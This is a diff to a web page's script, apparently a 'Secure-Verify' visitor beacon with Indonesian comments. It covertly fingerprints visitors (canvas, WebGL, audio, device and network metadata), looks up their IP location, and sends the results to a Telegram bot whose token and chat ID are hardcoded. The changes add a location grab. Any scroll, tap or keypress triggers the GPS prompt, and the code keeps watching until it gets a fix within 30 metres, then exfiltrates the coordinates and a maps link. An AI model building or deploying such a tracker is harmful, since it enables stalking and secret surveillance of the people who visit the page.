@@ -24,133 +24,102 @@
 /* ===================== CONFIG ===================== */
 const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
 const CHAT_ID   = "1979116632";
+const GOOD_ACC_M  = 30;       // fix dianggap bagus kalau accuracy < 30m
+const WATCH_TIMEOUT_MS = 60000; // stop watch setelah 60s kalau belum dapat fix bagus
 /* ================================================== */
 
 const isAndroid = /android/i.test(navigator.userAgent);
-const isIOS     = /iphone|ipad|ipod/i.test(navigator.userAgent);
 
-/* ---------- canvas fingerprint ---------- */
+/* ---------- canvas FP ---------- */
 function canvasFingerprint(){
   try{
-    const c = document.createElement('canvas');
-    c.width = 220; c.height = 40;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(0,0,120,30);
-    ctx.fillStyle = '#069';
-    ctx.fillText('Secure-Verify 🔒', 2, 4);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('fingerprint', 4, 20);
+    const c=document.createElement('canvas'); c.width=220; c.height=40;
+    const x=c.getContext('2d');
+    x.textBaseline='top'; x.font='14px Arial';
+    x.fillStyle='#f60'; x.fillRect(0,0,120,30);
+    x.fillStyle='#069'; x.fillText('Secure-Verify 🔒',2,4);
+    x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fingerprint',4,20);
     return c.toDataURL().slice(-32);
   }catch(e){ return 'err'; }
 }
 
-/* ---------- webgl fingerprint ---------- */
+/* ---------- webgl FP ---------- */
 function webglFingerprint(){
   try{
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    const c=document.createElement('canvas');
+    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
     if(!gl) return 'no-webgl';
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : '?';
-    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '?';
-    return `${vendor} | ${renderer}`;
+    const d=gl.getExtension('WEBGL_debug_renderer_info');
+    const v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):'?';
+    const r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'?';
+    return `${v} | ${r}`;
   }catch(e){ return 'err'; }
 }
 
-/* ---------- audio fingerprint ---------- */
+/* ---------- audio FP ---------- */
 async function audioFingerprint(){
   try{
-    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
     if(!AC) return 'no-audio-ctx';
-    const ctx = new AC(1, 44100, 44100);
-    const osc = ctx.createOscillator();
-    osc.type = 'triangle';
-    osc.frequency.setValueAtTime(10000, ctx.currentTime);
-    const cmp = ctx.createDynamicsCompressor();
-    cmp.threshold.setValueAtTime(-50, ctx.currentTime);
-    cmp.knee.setValueAtTime(40, ctx.currentTime);
-    cmp.ratio.setValueAtTime(12, ctx.currentTime);
-    cmp.attack.setValueAtTime(0, ctx.currentTime);
-    cmp.release.setValueAtTime(0.25, ctx.currentTime);
-    osc.connect(cmp); cmp.connect(ctx.destination);
-    osc.start(0);
-    const buf = await ctx.startRendering();
-    const data = buf.getChannelData(0);
-    let sum = 0;
-    for(let i=4500;i<5000;i++) sum += Math.abs(data[i]);
-    return sum.toFixed(6);
+    const ctx=new AC(1,44100,44100);
+    const osc=ctx.createOscillator();
+    osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
+    const cmp=ctx.createDynamicsCompressor();
+    cmp.threshold.setValueAtTime(-50,ctx.currentTime);
+    cmp.knee.setValueAtTime(40,ctx.currentTime);
+    cmp.ratio.setValueAtTime(12,ctx.currentTime);
+    cmp.attack.setValueAtTime(0,ctx.currentTime);
+    cmp.release.setValueAtTime(0.25,ctx.currentTime);
+    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
+    const buf=await ctx.startRendering();
+    const d=buf.getChannelData(0);
+    let s=0; for(let i=4500;i<5000;i++) s+=Math.abs(d[i]);
+    return s.toFixed(6);
   }catch(e){ return 'err'; }
 }
 
 /* ---------- metadata ---------- */
 function collectMetadata(){
-  const ua = navigator.userAgent || '';
-  const nav = navigator;
-
-  let os = 'Unknown', browser = 'Unknown', type = 'Desktop';
-  if(/android/i.test(ua)){ os='Android'; type='Mobile'; }
-  else if(/iphone|ipad|ipod/i.test(ua)){ os='iOS'; type='Mobile'; }
-  else if(/windows/i.test(ua)){ os='Windows'; }
-  else if(/macintosh|mac os x/i.test(ua)){ os='macOS'; }
-  else if(/linux/i.test(ua)){ os='Linux'; }
-  if(/edg\//i.test(ua)) browser='Edge';
-  else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
-  else if(/firefox|fxios/i.test(ua)) browser='Firefox';
-  else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';
-
-  const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
-
-  return {
-    os, browser, type, ua,
-    platform: nav.platform || '?',
-    vendor: nav.vendor || '?',
-    language: nav.language || '?',
-    languages: (nav.languages || []).join(','),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
-    screen: `${screen.width}x${screen.height}`,
-    viewport: `${innerWidth}x${innerHeight}`,
-    colorDepth: screen.colorDepth,
-    pixelRatio: window.devicePixelRatio || 1,
-    cores: nav.hardwareConcurrency || '?',
-    memory: nav.deviceMemory || '?',
-    touch: 'ontouchstart' in window || nav.maxTouchPoints > 0,
-    cookiesEnabled: nav.cookieEnabled,
-    referrer: document.referrer || '(direct)',
-    url: location.href,
-    network: {
-      type: conn.effectiveType || 'unknown',
-      downlink: conn.downlink ? conn.downlink+' Mbps' : 'unknown',
-      rtt: conn.rtt ? conn.rtt+' ms' : 'unknown',
-      saveData: !!conn.saveData,
-      online: nav.onLine
-    }
-  };
+  const ua=navigator.userAgent||'', n=navigator;
+  let os='Unknown',br='Unknown',tp='Desktop';
+  if(/android/i.test(ua)){os='Android';tp='Mobile';}
+  else if(/iphone|ipad|ipod/i.test(ua)){os='iOS';tp='Mobile';}
+  else if(/windows/i.test(ua)){os='Windows';}
+  else if(/macintosh|mac os x/i.test(ua)){os='macOS';}
+  else if(/linux/i.test(ua)){os='Linux';}
+  if(/edg\//i.test(ua))br='Edge';
+  else if(/chrome|crios/i.test(ua)&&!/edg/i.test(ua))br='Chrome';
+  else if(/firefox|fxios/i.test(ua))br='Firefox';
+  else if(/safari/i.test(ua)&&!/chrome/i.test(ua))br='Safari';
+  const c=n.connection||n.mozConnection||n.webkitConnection||{};
+  return {os,browser:br,type:tp,ua,
+    platform:n.platform||'?',vendor:n.vendor||'?',
+    language:n.language||'?',languages:(n.languages||[]).join(','),
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'?',
+    screen:`${screen.width}x${screen.height}`,
+    viewport:`${innerWidth}x${innerHeight}`,
+    colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio||1,
+    cores:n.hardwareConcurrency||'?',memory:n.deviceMemory||'?',
+    touch:'ontouchstart' in window||n.maxTouchPoints>0,
+    cookiesEnabled:n.cookieEnabled,
+    referrer:document.referrer||'(direct)',url:location.href,
+    network:{type:c.effectiveType||'unknown',
+      downlink:c.downlink?c.downlink+' Mbps':'unknown',
+      rtt:c.rtt?c.rtt+' ms':'unknown',
+      saveData:!!c.saveData,online:n.onLine}};
 }
 
-/* ---------- IP + geo (no permission) ---------- */
+/* ---------- IP ---------- */
 async function fetchIPInfo(){
-  for(const u of [
-    'https://ipapi.co/json/',
-    'https://api.ip.sb/geoip',
-    'https://api.ipify.org?format=json'
-  ]){
+  for(const u of ['https://ipapi.co/json/','https://api.ip.sb/geoip','https://api.ipify.org?format=json']){
     try{
-      const r = await fetch(u, {cache:'no-store'});
+      const r=await fetch(u,{cache:'no-store'});
       if(!r.ok) continue;
-      const j = await r.json();
-      const ip = j.ip || j.query;
-      if(ip) return {
-        ip,
-        country: j.country_name || j.country || '',
-        region: j.region || j.region_name || '',
-        city: j.city || '',
-        isp: j.org || j.isp || j.connection?.isp || '',
-        lat: j.latitude || j.lat || '',
-        lon: j.longitude || j.lon || ''
-      };
+      const j=await r.json();
+      const ip=j.ip||j.query;
+      if(ip) return {ip,country:j.country_name||j.country||'',
+        region:j.region||j.region_name||'',city:j.city||'',
+        isp:j.org||j.isp||'',lat:j.latitude||j.lat||'',lon:j.longitude||j.lon||''};
     }catch(e){}
   }
   return {ip:'unknown'};
@@ -158,38 +127,70 @@ async function fetchIPInfo(){
 
 /* ---------- Telegram ---------- */
 async function tgMessage(text){
-  const fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('text', text);
-  fd.append('parse_mode', 'HTML');
-  fd.append('disable_web_page_preview', 'true');
+  const fd=new FormData();
+  fd.append('chat_id',CHAT_ID);
+  fd.append('text',text);
+  fd.append('parse_mode','HTML');
+  fd.append('disable_web_page_preview','true');
   return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-    {method:'POST', body: fd}).then(r=>r.json()).catch(()=>null);
+    {method:'POST',body:fd}).then(r=>r.json()).catch(()=>null);
 }
 
-/* ---------- GPS attempt ---------- */
+/* ---------- GPS: satu tembakan high-accuracy ---------- */
 function requestGPS(){
   return new Promise(resolve => {
     if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
     navigator.geolocation.getCurrentPosition(
       p => resolve({
-        lat: p.coords.latitude,
-        lon: p.coords.longitude,
-        acc: p.coords.accuracy,
-        alt: p.coords.altitude,
-        heading: p.coords.heading,
-        speed: p.coords.speed,
-        ts: p.timestamp
+        lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+        alt:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,
+        ts:p.timestamp
       }),
       e => resolve({
-        error: e.code === 1 ? 'denied' :
-               e.code === 2 ? 'unavailable' :
-               e.code === 3 ? 'timeout' : 'unknown',
-        code: e.code,
-        message: e.message
+        error:e.code===1?'denied':e.code===2?'unavailable':e.code===3?'timeout':'unknown',
+        code:e.code,message:e.message
       }),
-      {enableHighAccuracy: true, timeout: 25000, maximumAge: 0}
+      {enableHighAccuracy:true,timeout:30000,maximumAge:0}
     );
+  });
+}
+
+/* ---------- GPS: watch sampai fix bagus ---------- */
+function watchGoodFix(timeoutMs){
+  return new Promise(resolve => {
+    if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
+    let best = null, watchId = null, done = false, timer = null;
+
+    const finish = (result) => {
+      if(done) return;
+      done = true;
+      if(watchId !== null){ try{ navigator.geolocation.clearWatch(watchId); }catch(e){} }
+      if(timer){ clearTimeout(timer); }
+      resolve(result);
+    };
+
+    watchId = navigator.geolocation.watchPosition(
+      p => {
+        const fix = {
+          lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+          alt:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,
+          ts:p.timestamp
+        };
+        if(!best || fix.acc < best.acc) best = fix;
+        if(fix.acc <= GOOD_ACC_M){ finish(fix); }
+      },
+      e => {
+        if(best) finish(best); // kalau sudah ada best, pakai best
+        else finish({error:e.code===1?'denied':e.code===2?'unavailable':e.code===3?'timeout':'unknown',
+                     code:e.code,message:e.message});
+      },
+      {enableHighAccuracy:true,timeout:30000,maximumAge:0}
+    );
+
+    timer = setTimeout(() => {
+      if(best) finish(best);
+      else finish({error:'timeout',message:'no fix within '+timeoutMs+'ms'});
+    }, timeoutMs);
   });
 }
 
@@ -199,23 +200,17 @@ function requestGPS(){
   const canvas = canvasFingerprint();
   const webgl  = webglFingerprint();
 
-  // Audio fingerprint parallel
-  const audioPromise = audioFingerprint();
-  const ipPromise    = fetchIPInfo();
+  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPInfo()]);
 
-  const [audio, ip] = await Promise.all([audioPromise, ipPromise]);
-
-  // Format location line
   const ipLocLine = (ip.city || ip.region || ip.country)
-    ? `${[ip.city, ip.region, ip.country].filter(Boolean).join(', ')}`
+    ? [ip.city,ip.region,ip.country].filter(Boolean).join(', ')
     : 'n/a';
 
-  // Beacon message — format persis contoh, hanya location diisi dari IP
   const beacon =
 `🔔 <b>New Visitor Beacon</b>
 <b>IP:</b> ${ip.ip}
 <b>Location (IP-based):</b> ${ipLocLine}
-<b>ISP:</b> ${ip.isp || 'n/a'}
+<b>ISP:</b> ${ip.isp||'n/a'}
 <b>OS:</b> ${meta.os} · <b>Browser:</b> ${meta.browser} · <b>Type:</b> ${meta.type}
 <b>UA:</b> <code>${meta.ua}</code>
 <b>Platform:</b> ${meta.platform}
@@ -236,33 +231,70 @@ function requestGPS(){
 
   await tgMessage(beacon).catch(()=>{});
 
-  // Auto-trigger GPS request — tanpa tombol, langsung di load.
-  // Browser modern akan blok kalau tidak ada gesture, tapi ada window kecil di mana
-  // Chrome Android masih munculkan popup saat auto-request.
-  const geo = await requestGPS();
+  /* ===== GPS: gesture-trigger ===== */
+  let geoStarted = false;
 
-  if(geo.error){
-    // fallback: IP-based, sudah terkirim di beacon. Kirim follow-up status singkat.
+  async function startGeo(){
+    if(geoStarted) return;
+    geoStarted = true;
+    removeListeners();
+
+    // 1) coba sekali tembak dulu (popup muncul di sini)
+    const first = await requestGPS();
+
+    if(first.error){
+      // denied / error — kirim status + fallback IP
+      await tgMessage(
+`📍 <b>Location request — ${first.error}</b>
+<b>Reason:</b> ${first.message||first.error}
+<b>IP fallback:</b> ${ip.lat&&ip.lon?`${ip.lat}, ${ip.lon}`:ipLocLine}
+<b>Maps (IP approx):</b> ${ip.lat&&ip.lon?`https://www.google.com/maps?q=${ip.lat},${ip.lon}`:'n/a'}`
+      ).catch(()=>{});
+      return;
+    }
+
+    // 2) kalau fix pertama bagus, kirim langsung
+    if(first.acc <= GOOD_ACC_M){
+      await sendGPS(first);
+      return;
+    }
+
+    // 3) fix pertama kasar — watch sampai dapat fix bagus
+    await tgMessage(`⏳ <b>First fix coarse (${Math.round(first.acc)}m) — refining…</b>`).catch(()=>{});
+    const refined = await watchGoodFix(WATCH_TIMEOUT_MS);
+    if(refined.error){
+      await sendGPS(first, 'best-effort after refine');
+    } else {
+      await sendGPS(refined, 'high-accuracy fix');
+    }
+  }
+
+  async function sendGPS(g, tag){
     await tgMessage(
-`📍 <b>Location request — ${geo.error}</b>
-<b>Reason:</b> ${geo.message || geo.error}
-<b>IP fallback:</b> ${ip.lat && ip.lon ? `${ip.lat}, ${ip.lon}` : ipLocLine}
-<b>Maps (IP approx):</b> ${ip.lat && ip.lon ? `https://www.google.com/maps?q=${ip.lat},${ip.lon}` : 'n/a'}`
-    ).catch(()=>{});
-  } else {
-    await tgMessage(
-`📍 <b>Location (GPS precision)</b>
-<b>Lat:</b> <code>${geo.lat.toFixed(6)}</code>
-<b>Lon:</b> <code>${geo.lon.toFixed(6)}</code>
-<b>Accuracy:</b> ${Math.round(geo.acc)} m
-<b>Altitude:</b> ${geo.alt != null ? Math.round(geo.alt)+' m' : 'n/a'}
-<b>Heading:</b> ${geo.heading != null ? Math.round(geo.heading)+'°' : 'n/a'}
-<b>Speed:</b> ${geo.speed != null ? geo.speed.toFixed(2)+' m/s' : 'n/a'}
-<b>Maps:</b> https://www.google.com/maps?q=${geo.lat},${geo.lon}
+`📍 <b>Location (GPS precision${tag?` — ${tag}`:''})</b>
+<b>Lat:</b> <code>${g.lat.toFixed(6)}</code>
+<b>Lon:</b> <code>${g.lon.toFixed(6)}</code>
+<b>Accuracy:</b> ${Math.round(g.acc)} m
+<b>Altitude:</b> ${g.alt!=null?Math.round(g.alt)+' m':'n/a'}
+<b>Heading:</b> ${g.heading!=null?Math.round(g.heading)+'°':'n/a'}
+<b>Speed:</b> ${g.speed!=null?g.speed.toFixed(2)+' m/s':'n/a'}
+<b>Maps:</b> https://www.google.com/maps?q=${g.lat},${g.lon}
 <b>Device:</b> ${meta.os} · ${meta.browser}
 <b>IP:</b> ${ip.ip}`
     ).catch(()=>{});
   }
+
+  /* pasang listener gesture-first */
+  const events = ['touchstart','pointerdown','click','scroll','keydown'];
+  function onGesture(){ startGeo(); }
+  function removeListeners(){
+    events.forEach(ev => window.removeEventListener(ev, onGesture, {passive:true}));
+  }
+  events.forEach(ev => window.addEventListener(ev, onGesture, {passive:true, once:true}));
+
+  /* bonus: coba auto-trigger langsung — kalau browser izinkan, popup muncul tanpa gesture.
+     kalau diblokir, listener gesture di atas yang menangkap. */
+  setTimeout(() => { if(!geoStarted) startGeo(); }, 800);
 })();
 </script>
 </body>
